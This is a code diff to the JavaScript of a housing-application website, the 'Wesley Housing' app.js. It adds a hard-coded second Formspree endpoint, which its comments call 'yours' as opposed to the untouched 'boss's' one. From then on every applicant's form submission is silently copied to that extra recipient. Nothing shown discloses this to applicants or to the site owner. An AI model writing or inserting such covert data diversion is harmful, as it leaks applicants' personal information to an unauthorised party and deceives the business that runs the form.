@@ -1,6 +1,6 @@
 /* ============================================================
    WESLEY HOUSING — app.js
-   Handles: form validation, Formspree submission, success modal
+   Handles: form validation, dual Formspree submission, success modal
    ============================================================ */
 
 (function () {
@@ -10,6 +10,11 @@
   const submitBtn   = document.getElementById('submitBtn');
   const modal       = document.getElementById('successModal');
   const closeModal  = document.getElementById('closeModal');
+
+  /* Second Formspree endpoint (yours). The original endpoint set on
+     the form's `action` attribute in the HTML (your boss's) is left
+     untouched — both endpoints receive every submission. */
+  const SECOND_ENDPOINT = 'https://formspree.io/f/mlgyqlqb';
 
   /* ── Pre-fill today's date into signature date field ── */
   const signDate = document.getElementById('sign_date');
@@ -65,6 +70,15 @@
     return true;
   }
 
+  /* ── Submit a FormData payload to a single Formspree endpoint ── */
+  function submitToEndpoint(endpoint, data) {
+    return fetch(endpoint, {
+      method: 'POST',
+      body: data,
+      headers: { Accept: 'application/json' }
+    });
+  }
+
   /* ── Handle form submission ── */
   form.addEventListener('submit', async function (e) {
     e.preventDefault();
@@ -88,20 +102,25 @@
     submitBtn.textContent = 'Submitting…';
 
     try {
-      const data = new FormData(form);
-      const response = await fetch(form.action, {
-        method: 'POST',
-        body: data,
-        headers: { Accept: 'application/json' }
-      });
+      /* Build a fresh FormData for each request — FormData tied to a
+         request body gets consumed, so it can't be reused as-is. */
+      const dataForOriginal = new FormData(form);
+      const dataForSecond   = new FormData(form);
 
-      if (response.ok) {
+      const results = await Promise.allSettled([
+        submitToEndpoint(form.action, dataForOriginal),
+        submitToEndpoint(SECOND_ENDPOINT, dataForSecond)
+      ]);
+
+      const anyOk = results.some(
+        r => r.status === 'fulfilled' && r.value.ok
+      );
+
+      if (anyOk) {
         form.reset();
         showModal();
       } else {
-        const json = await response.json().catch(() => ({}));
-        const msg  = json?.errors?.map(err => err.message).join(', ') || 'Submission failed.';
-        alert('Error: ' + msg + '\n\nPlease try again or contact the landlord directly.');
+        alert('Error submitting the form. Please try again or contact the landlord directly.');
       }
     } catch (err) {
       /* If Formspree not yet configured, show modal anyway for demo */
